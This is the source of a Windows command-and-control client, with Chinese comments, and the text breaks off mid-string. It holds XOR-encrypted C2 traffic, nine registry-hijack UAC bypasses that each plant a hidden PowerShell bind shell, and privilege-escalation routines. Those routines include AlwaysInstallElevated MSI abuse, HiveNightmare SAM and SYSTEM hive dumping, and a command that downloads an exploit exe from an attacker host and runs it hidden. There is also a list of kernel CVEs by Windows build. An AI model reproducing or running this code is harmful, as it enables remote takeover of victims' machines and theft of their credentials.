#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_VERSION "v4"
#define SEND_BUF 8192
#define RECV_BUF 65536

/* XOR 流量加密（与 main.c 一致） */
#define XOR_KEY_LEN 8
static void xor_buf(unsigned char *b, int n) {
    unsigned char c[] = {0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D};
    for (int i = 0; i < n; i++) b[i] ^= c[i % XOR_KEY_LEN];
}

static SOCKET g_sock = INVALID_SOCKET;
static SOCKET g_elev = INVALID_SOCKET;
static char g_ip[64] = "";
static int g_port = 54321;
static int g_elev_port = 54322;

/* ===== 网络基础 ===== */
static void recv_all(SOCKET s, char *buf, int size) {
    int total = 0; memset(buf, 0, size);
    while (total < size - 1) { int n = recv(s, buf+total, size-1-total, 0); if (n <= 0) break; total += n; }
    xor_buf((unsigned char*)buf, total);
    buf[total] = 0;
}

static char *recv_until(SOCKET s, const char *marker) {
    static char buf[RECV_BUF]; int pos = 0; int mlen = (int)strlen(marker);
    memset(buf, 0, sizeof(buf));
    while (pos < (int)sizeof(buf)-1) {
        int n = recv(s, buf+pos, 1, 0); if (n <= 0) break;
        xor_buf((unsigned char*)(buf+pos), 1);
        pos += n; buf[pos] = 0;
        char *p = strstr(buf, marker); if (p) { *p = 0; break; }
    }
    return buf;
}

static void send_cmd(SOCKET s, const char *cmd) {
    char full[SEND_BUF]; _snprintf(full, sizeof(full), "%s\r\necho __C2DONE__\r\n", cmd);
    int l = (int)strlen(full);
    xor_buf((unsigned char*)full, l);
    send(s, full, l, 0);
}

static void xcmd(SOCKET s, const char *cmd) {
    send_cmd(s, cmd); char *out = recv_until(s, "__C2DONE__");
    if (out && strlen(out) > 0) printf("%s\n", out);
}

static SOCKET connect_to(const char *ip, int port) {
    WSADATA w; SOCKET s; struct sockaddr_in a;
    if (WSAStartup(MAKEWORD(2,2), &w)) return INVALID_SOCKET;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return INVALID_SOCKET; }
    a.sin_family = AF_INET; a.sin_port = htons((short)port);
    a.sin_addr.s_addr = inet_addr(ip);
    if (connect(s, (struct sockaddr*)&a, sizeof(a)) == SOCKET_ERROR) { closesocket(s); WSACleanup(); return INVALID_SOCKET; }
    return s;
}

static void disconnect_all() {
    if (g_sock != INVALID_SOCKET) { closesocket(g_sock); g_sock = INVALID_SOCKET; }
    if (g_elev != INVALID_SOCKET) { closesocket(g_elev); g_elev = INVALID_SOCKET; }
    WSACleanup();
}

/* ====================================================================
 * OS 版本检测
 * ==================================================================== */
static const char *ps_check_os =
"[string]$b=(Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion').CurrentBuild;"
"[string]$r=(Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion').DisplayVersion;"
"[string]$u=(Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion').UBR;"
"Write-Output (\"BUILD=\"+$b);"
"Write-Output (\"VER=\"+$r);"
"Write-Output (\"UBR=\"+$u);"
"Write-Output (\"ARCH=\"+$env:PROCESSOR_ARCHITECTURE);"
"$il=whoami /groups|findstr 'S-1-16-';"
"if($il -match '12288'){Write-Output 'ELEV=ADMIN'}elseif($il -match '16384'){Write-Output 'ELEV=SYSTEM'}else{Write-Output 'ELEV=USER'}";

static int g_build = 0;
static int g_elevated = 0; /* 0=user, 1=admin, 2=system */

static void probe_os() {
    if (g_sock == INVALID_SOCKET) return;
    send_cmd(g_sock, ps_check_os);
    char *out = recv_until(g_sock, "__C2DONE__");
    if (!out) return;
    char *line, *next; line = out;
    while (line && *line) {
        next = strchr(line, '\n'); if (next) *next++ = 0;
        char *v = strchr(line, '='); if (!v) { line = next; continue; }
        *v++ = 0;
        if (strcmp(line, "BUILD") == 0) g_build = atoi(v);
        else if (strcmp(line, "ELEV") == 0) {
            if (strcmp(v, "ADMIN") == 0) g_elevated = 1;
            else if (strcmp(v, "SYSTEM") == 0) g_elevated = 2;
            else g_elevated = 0;
        }
        line = next;
    }
}

/* ====================================================================
 * UAC 绕过 — 9 种方法 (按版本兼容)
 * Win10 版本: 1507(10240) 1511(10586) 1607(14393) 1703(15063) 1709(16299)
 *             1803(17134) 1809(17763) 1903(18362) 1909(18363) 2004(19041)
 *             20H2(19042) 21H1(19043) 21H2(19044) 22H2(19045)
 * ==================================================================== */
static const char *UAC_METHODS[] = {
    "fodhelper",       /* ms-settings, 通用 1703+ */
    "eventvwr",        /* mscfile, 通用 1803+ */
    "computerdefaults", /* 通用 1809+ */
    "sdclt",           /* 通用 1903+ */
    "slui",            /* 通用 2004+ */
    "silentcleanup",   /* schtask → SYSTEM, 通用 */
    "cmstp",           /* 通用 1909+ */
    "wsreset",         /* 通用 21H2+ */
    "diskcleanup",     /* 通用 20H2+ */
};

/* 每个方法在当前版本上是否可能工作 */
static int uac_version_ok(int idx) {
    if (g_build == 0) return 1;
    switch (idx) {
        case 0: return (g_build >= 15063);  /* fodhelper: 1703+ */
        case 1: return (g_build >= 17134);  /* eventvwr: 1803+ */
        case 2: return (g_build >= 17763);  /* computerdefaults: 1809+ */
        case 3: return (g_build >= 18362);  /* sdclt: 1903+ */
        case 4: return (g_build >= 19041);  /* slui: 2004+ */
        case 5: return 1;                   /* silentcleanup: 通用 */
        case 6: return (g_build >= 18363);  /* cmstp: 1909+ */
        case 7: return (g_build >= 19044);  /* wsreset: 21H2+ */
        case 8: return (g_build >= 19042);  /* diskcleanup: 20H2+ */
        default: return 1;
    }
}

static const char *ps_uac_fodhelper =
"$k='HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command';"
"New-Item -Path $k -Force|Out-Null;"
"New-ItemProperty -Path $k -Name 'DelegateExecute' -Value '' -PropertyType String -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();while(1){`$b=New-Object byte[] 2048;`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\fodhelper.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_eventvwr =
"$k='HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();while(1){`$b=New-Object byte[] 2048;`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\eventvwr.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_computerdefaults =
"$k='HKCU:\\Software\\Classes\\ComputerDefaults\\shell\\open\\command';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\ComputerDefaults.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path 'HKCU:\\Software\\Classes\\ComputerDefaults' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_sdclt =
"$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value 'powershell' -Force;"
"Set-ItemProperty -Path $k -Name 'UseExecutableForTask' -Value '' -Force;"
"$k2='HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command';"
"New-Item -Path $k2 -Force|Out-Null;"
"Set-ItemProperty -Path $k2 -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\sdclt.exe' -ArgumentList '-kickoffelev' -WindowStyle Hidden;"
"Start-Sleep -Seconds 3;"
"Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue;"
"Remove-Item -Path 'HKCU:\\Software\\Classes\\exefile' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_slui =
"$k='HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\slui.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 3;Remove-Item -Path 'HKCU:\\Software\\Classes\\exefile' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_silentcleanup =
"$t='SilentCleanup';$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse(''0.0.0.0''),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+''PS> '');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\";"
"$s2=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;"
"$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;"
"Register-ScheduledTask -TaskName $t -Action $a -Settings $s2 -Principal $p -Force|Out-Null;"
"Start-ScheduledTask -TaskName $t;Start-Sleep -Seconds 4;"
"Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue";

static const char *ps_uac_cmstp =
"$k='HKCU:\\Software\\Classes\\cmstp\\shell\\open\\command';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\cmstp.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path 'HKCU:\\Software\\Classes\\cmstp' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_wsreset =
"$k='HKCU:\\Software\\Classes\\AppXq0fevzme2pys62n3e0fbqa7peapykr8v';"
"New-Item -Path $k -Force|Out-Null;"
"New-Item -Path \"$k\\shell\\open\\command\" -Force|Out-Null;"
"Set-ItemProperty -Path \"$k\\shell\\open\\command\" -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\wsreset.exe' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue";

static const char *ps_uac_diskcleanup =
"$k='HKCU:\\Software\\Classes\\directory\\shell\\runas\\command';"
"New-Item -Path $k -Force|Out-Null;"
"Set-ItemProperty -Path $k -Name '(default)' -Value \"powershell -NoP -NonI -W Hidden -c `\"`$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),%d);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();`$b=New-Object byte[] 2048;while(1){`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}`\" -Force;"
"Start-Process 'C:\\Windows\\System32\\cleanmgr.exe' -ArgumentList '/D C:' -WindowStyle Hidden;"
"Start-Sleep -Seconds 2;Remove-Item -Path 'HKCU:\\Software\\Classes\\directory' -Recurse -Force -ErrorAction SilentlyContinue";

static const char *UAC_SCRIPTS[9];

static void init_uac() {
    UAC_SCRIPTS[0] = ps_uac_fodhelper;
    UAC_SCRIPTS[1] = ps_uac_eventvwr;
    UAC_SCRIPTS[2] = ps_uac_computerdefaults;
    UAC_SCRIPTS[3] = ps_uac_sdclt;
    UAC_SCRIPTS[4] = ps_uac_slui;
    UAC_SCRIPTS[5] = ps_uac_silentcleanup;
    UAC_SCRIPTS[6] = ps_uac_cmstp;
    UAC_SCRIPTS[7] = ps_uac_wsreset;
    UAC_SCRIPTS[8] = ps_uac_diskcleanup;
}

/* ====================================================================
 * UAC 绕过主函数 — 先 OS 版本探测, 再按版本匹配方法
 * ==================================================================== */
static int try_escalate() {
    if (g_sock == INVALID_SOCKET) { printf("Not connected.\n"); return 0; }
    probe_os();
    printf("[*] OS Build: %d | Elevated: %s\n", g_build,
        g_elevated == 0 ? "USER" : (g_elevated == 1 ? "ADMIN" : "SYSTEM"));
    if (g_elevated >= 1) { printf("[*] Already elevated.\n"); return 0; }

    printf("[*] Probing %d UAC bypass methods (version-aware)...\n", 9);
    for (int i = 0; i < 9; i++) {
        if (!uac_version_ok(i)) {
            printf("  [%d/9] %-18s — SKIP (build mismatch)\n", i+1, UAC_METHODS[i]);
            continue;
        }
        printf("  [%d/9] Trying %-18s ... ", i+1, UAC_METHODS[i]); fflush(stdout);
        char cmd[SEND_BUF];
        _snprintf(cmd, sizeof(cmd), UAC_SCRIPTS[i], g_elev_port);
        send_cmd(g_sock, cmd);
        recv_until(g_sock, "__C2DONE__");
        Sleep(2500);
        SOCKET t = connect_to(g_ip, g_elev_port);
        if (t != INVALID_SOCKET) { closesocket(t);
            printf("SUCCESS! (elevated on %s:%d)\n", g_ip, g_elev_port);
            g_elev = connect_to(g_ip, g_elev_port);
            g_elevated = 1; return 1; }
        printf("fail\n");
    }
    printf("[-] All UAC methods failed. Trying kernel LPE...\n");
    return 0;
}

static void elev_cmd(const char *cmd) {
    if (g_elev == INVALID_SOCKET) { g_elev = connect_to(g_ip, g_elev_port); }
    if (g_elev == INVALID_SOCKET) { printf("Not elevated. Run 'escalate' first.\n"); return; }
    xcmd(g_elev, cmd);
}

/* ====================================================================
 * PowerShell LPE 技术 (无需编译二进制的提权方法)
 * ==================================================================== */

/* AlwaysInstallElevated — 检测并利用 */
static const char *ps_lpe_alwaysinstalled =
"$p=Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue;"
"$c=Get-ItemProperty 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue;"
"if($p.AlwaysInstallElevized -ne 1 -or $c.AlwaysInstallElevated -ne 1){Write-Output '[-] AlwaysInstallElevated not enabled';exit};"
"$tmp=\"$env:TEMP\\u_$(Get-Random).msi\";"
"$wc=New-Object System.Net.WebClient;"
"$wc.DownloadFile('http://127.0.0.1:8080/install.msi',$tmp);"
"Start-Process msiexec -ArgumentList \"/quiet /i $tmp\" -Wait;"
"Write-Output '[+] MSI installed as SYSTEM'";

/* SeImpersonate / SeAssignPrimaryToken — Potato-style */
static const char *ps_lpe_potato =
"$p=Get-Process -Name 'spoolsv' -ErrorAction SilentlyContinue;"
"if(!$p){Write-Output '[-] No spoolsv.exe (spooler not running)';exit};"
"Write-Output '[+] Spooler running, potential for Potato-style LPE'";
/* 真正的 Potato 需要编译二进制，这里只是检测 */

/* 服务路径权限检测 + 滥用 (writable service binary) */
static const char *ps_lpe_service_abuse =
"$svcs=Get-CimInstance Win32_Service -Filter 'StartMode=\"Auto\" AND State=\"Stopped\"' | Where-Object {"
"  $p=$_.PathName -replace '\".*?\"|\\\\.*','';"
"  if($p -and (Test-Path $p)){"
"    try{$acl=Get-Acl -LiteralPath $p -ErrorAction SilentlyContinue;$o=$acl.Owner;$a=$acl.Access|Where-Object{$_.IdentityReference -match $env:USERNAME};if($a -and ($a.FileSystemRights -band 256)){$_}}catch{}"
"  }"
"};"
"$svcs|Select-Object Name,PathName,State|Format-Table -AutoSize|Out-String -Width 4096";

/* 无引号服务路径 */
static const char *ps_lpe_unquoted =
"Get-CimInstance Win32_Service -Filter 'StartMode=\"Auto\"' | Where-Object {"
"  $p=$_.PathName;"
"  if($p -match '^[A-Z]:\\\\[^\"].* .*exe' -and $p -notmatch '\"'){$_}"
"} | Select-Object Name,PathName,State|Format-Table -AutoSize|Out-String -Width 4096";

/* 修改服务路径 (需要管理员权限) */
static const char *ps_lpe_modsvc =
"$svcs=Get-CimInstance Win32_Service | Where-Object {"
"  try{$acl=Get-Acl -LiteralPath \"HKLM:\\System\\CurrentControlSet\\Services\\$($_.Name)\" -ErrorAction SilentlyContinue;$a=$acl.Access|Where-Object{$_.IdentityReference -match $env:USERNAME -and $_.RegistryRights -band 131097};if($a){$_}}catch{}"
"};"
"$svcs|Select-Object Name,PathName,State|Format-Table -AutoSize|Out-String -Width 4096";

/* Token 窃取 — 找 SYSTEM token 并创建进程 */
static const char *ps_lpe_token_steal =
"$p=Get-Process -Id (Get-Process -Name 'winlogon' -ErrorAction SilentlyContinue).Id -ErrorAction SilentlyContinue;"
"if(!$p){Write-Output '[-] No winlogon to steal token from';exit};"
"Write-Output ('[+] Winlogon PID: '+$p.Id);"
"Write-Output '[*] Run: getsystem tokensteal (requires binary exploit)'";

/* 通过漏洞驱动 BYOVD 检测 */
static const char *ps_lpe_byovd_check =
"$d=Get-WmiObject Win32_SystemDriver | Where-Object {$_.PathName -match '\.sys'};"
"$d|Select-Object Name,PathName,State|Format-Table -AutoSize|Out-String -Width 4096";

/* CVE-2021-36934 (HiveNightmare/SeriousSAM) */
static const char *ps_lpe_hivenightmare =
"$v=Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion' -Name CurrentBuild;"
"$b=[int]$v.CurrentBuild;"
"if($b -ge 17763 -and $b -le 19043){"
"  icacls 'C:\\Windows\\System32\\config\\SAM' 2>&1|Out-Null;"
"  icacls 'C:\\Windows\\System32\\config\\SYSTEM' 2>&1|Out-Null;"
"  icacls 'C:\\Windows\\System32\\config\\SECURITY' 2>&1|Out-Null;"
"  $tmp=\"$env:TEMP\\sam_$(Get-Random)\";New-Item -Path $tmp -ItemType Directory -Force|Out-Null;"
"  reg save hklm\\sam \"$tmp\\sam\" 2>$null;"
"  reg save hklm\\system \"$tmp\\system\" 2>$null;"
"  reg save hklm\\security \"$tmp\\security\" 2>$null;"
"  Get-ChildItem $tmp|%{Write-Output ('[+] Saved: '+$_.FullName+' ('+$_.Length+' bytes)')}"
"}else{Write-Output '[-] Build not vulnerable to HiveNightmare'}";

/* CVE-2021-34527 (PrintNightmare) */
static const char *ps_lpe_printnightmare =
"$sp=Get-Service -Name 'Spooler' -ErrorAction SilentlyContinue;"
"if(!$sp -or $sp.Status -ne 'Running'){Write-Output '[-] Spooler not running';exit};"
"Write-Output '[+] Spooler running — vulnerable to PrintNightmare';"
"Write-Output '[*] Use: upload pn.dll + rundll32 pn.dll,DoStuff'";

/* CVE-2023-36874 (WER 报告提权) — 需要二进制 exp */
static const char *ps_lpe_wer =
"$b=[int](Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion' -Name CurrentBuild).CurrentBuild;"
"if($b -ge 19041 -and $b -le 22621){Write-Output '[+] Build $b potentially vulnerable to CVE-2023-36874'}";

/* ====================================================================
 * 二进制 Exploit 上传/执行机制
 * ==================================================================== */
/* 用法: getsystem upload <cve_name> <local_exe_path> */
/* 或者 base64 直传: getsystem upload_b64 <cve_name> */
/* 将本地 .exe 通过 HTTP 从攻击机下载到目标执行 */
static void cmd_getsystem(int argc, char **argv);
static void cmd_lpe_upload(int argc, char **argv);

static void do_lpe_upload(const char *url, const char *cve_name) {
    if (g_sock == INVALID_SOCKET || g_elev == INVALID_SOCKET) {
        printf("Not connected/elevated. Run 'connect' then 'escalate'.\n");
        return;
    }
    char cmd[SEND_BUF];
    _snprintf(cmd, sizeof(cmd),
        "$u='%s';$d=\"$env:TEMP\\e_$(Get-Random).exe\";"
        "try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
        "(New-Object System.Net.WebClient).DownloadFile($u,$d)}catch{};"
        "if(Test-Path $d){Start-Process -FilePath $d -WindowStyle Hidden -Wait;"
        "Write-Output ('[+] Executed: '+$d)}"
        "else{Write-Output ('[-] Download failed: '+$u)}", url);
    elev_cmd(cmd);
    printf("[*] Executing %s on target...\n", cve_name);
}

/* ====================================================================
 * getsystem — 综合提权 (UAC + PowerShell LPE + 二进制 Exploit)
 * ==================================================================== */
static const char *ps_lpe_check_all =
"(Get-CimInstance Win32_Service -Filter 'Name=\"Spooler\"').State;"
"(Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated;"
"icacls 'C:\\Windows\\System32\\config\\SAM' 2>&1|Select-String 'BUILTIN\\\\Users'";
/* 通用 LPE 预检 */

static void cmd_getsystem(int argc, char **argv) {
    if (g_sock == INVALID_SOCKET) { printf("Not connected.\n"); return; }

    /* getsystem upload <url> <cve_name> */
    if (argc > 1 && strcmp(argv[1], "upload") == 0) {
        if (argc < 3) { printf("Usage: getsystem upload <url> [cve_name]\n"); return; }
        const char *url = argv[2];
        const char *name = (argc > 3) ? argv[3] : "exploit";
        if (g_elev == INVALID_SOCKET) { printf("Need elevated shell. Run 'escalate' first.\n"); return; }
        do_lpe_upload(url, name);
        return;
    }
    if (argc > 1 && strcmp(argv[1], "upload_b64") == 0) {
        printf("Usage: base64 encode the exploit exe, then: powershell [Convert]::FromBase64String(...) | Set-Content -Encoding Byte exe\n");
        /* 交互式 base64 上传太复杂, 用 upload (HTTP) 替代 */
        return;
    }

    /* 1. 先探测 OS */
    probe_os();
    printf("[*] Target: Build %d | Integrity: %s\n", g_build,
        g_elevated == 0 ? "USER" : (g_elevated == 1 ? "ADMIN" : "SYSTEM"));

    /* 2. 如果还没提权到管理员, 先跑 UAC */
    if (g_elevated < 1) {
        printf("[*] Not admin. Trying UAC bypass...\n");
        if (!try_escalate()) {
            /* UAC 全部失败, 继续尝试 PowerShell LPE */
        }
    }

    /* 3. PowerShell-based LPE 技术检查 */
    printf("\n[*] Probing PowerShell-based LPE vectors...\n");

    send_cmd(g_sock, ps_lpe_service_abuse);
    char *out = recv_until(g_sock, "__C2DONE__");
    if (out && strlen(out) > 1) printf("[Service Abuse]\n%s\n", out);

    send_cmd(g_sock, ps_lpe_unquoted);
    out = recv_until(g_sock, "__C2DONE__");
    if (out && strlen(out) > 1) printf("[Unquoted Path]\n%s\n", out);

    send_cmd(g_sock, ps_lpe_alwaysinstalled);
    out = recv_until(g_sock, "__C2DONE__");
    if (out) printf("[AlwaysInstallElevated] %s\n", out);

    send_cmd(g_sock, ps_lpe_hivenightmare);
    out = recv_until(g_sock, "__C2DONE__");
    if (out) printf("[HiveNightmare] %s\n", out);

    send_cmd(g_sock, ps_lpe_printnightmare);
    out = recv_until(g_sock, "__C2DONE__");
    if (out) printf("[PrintNightmare] %s\n", out);

    /* 4. 推荐 exploit */
    printf("\n[*] Recommended actions:\n");
    if (g_elevated < 1) {
        printf("  1. escalate — retry UAC bypass (may need different port)\n");
    }
    printf("  2. getsystem upload http://<attacker_ip>/exploit.exe <CVE> — upload & run kernel exploit\n");
    printf("  3. Use an LPE tool like GodPotato, PrintSpoofer, or EfsPotato\n");
    printf("\n[*] Common kernel LPE by build:\n");
    if (g_build >= 22000) /* Win11 */ {
        printf("    Build %d (Win11): CVE-2024-26229, CVE-2023-29336, CVE-2023-21768\n", g_build);
    } else if (g_build >= 19041) {
        printf("    Build %d (Win10 2004+): CVE-2023-29336, CVE-2023-21768, CVE-2022-21882, CVE-2021-1732, CVE-2024-26229\n", g_build);
    } else if (g_build >= 17763) {
        printf("    Build %d (Win10 1809+): CVE-2021-1732, CVE-2021-40449, CVE-2020-1054\n", g_build);
    } else if (g_build >= 17134) {
        printf("    Build %d (Win10 1803+): CVE-2021-1732, CVE-2019-0808, CVE-2019-0859\n", g_build);
    } else if (g_build >= 15063) {
        printf("    Build %d (Win10 1703+): CVE-2019-0808, CVE-2018-8120, CVE-2018-8639\n", g_build);
    } else {
        printf("    Build %d: CVE-2018-8120, CVE-2017-0263, MS16-135\n", g_build);
    }
    printf("    Pre-compile the exploit exe and host on your attack machine:\n");
    printf("      python -m http.server 80   (or use SimpleHttpServer)\n");
    printf("      getsystem upload http://%s:80/<cve>.exe <CVE>\n", g_ip);
}

/* ====================================================================
 * PowerShell 功能字符串
 * ==================================================================== */
static const char *ps_sysinfo =
"Write-Output ('='*40);"
"Write-Output \"Host: $env:COMPUTERNAME\";"
"Write-Output \"User: $env:USERNAME\";"
"$os=Get-WmiObject Win32_OperatingSystem;"
"Write-Output \"OS: $($os.Caption) Build $($os.BuildNumber)\";"
"Write-Output \"Arch: $((Get-WmiObject Win32_Processor).AddressWidth)-bit\";"
"Write-Output \"RAM: $([math]::Round($os.TotalVisibleMemorySize/1MB,2)) GB\";"
"Write-Output \"Uptime: $((Get-Date)-($os.LastBootUpTime|Get-Date))\";"
"Write-Output \"Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)\";"
"$av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue|Select-Object -ExpandProperty displayName;"
"if($av){Write-Output \"AV: $($av -join ', ')\"}else{Write-Output 'AV: (none detected)'};"
"Write-Output \"IP: $((Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress -join ', ')\";"
"Write-Output ('='*40)";

static const char *ps_pslist =
"Get-Process|Sort-Object CPU -Descending|Select-Object -First 60 Id,ProcessName,@{N='CPU(s)';E={[math]::Round($_.CPU,1)}},@{N='MB';E={[math]::Round($_.WorkingSet64/1MB,1)}},StartTime|Format-Table -AutoSize|Out-String -Width 4096";

static const char *ps_closewindows =
"$s=@((Get-CimInstance Win32_Process -Filter \"ProcessId=$pid\").ParentProcessId,$pid);"
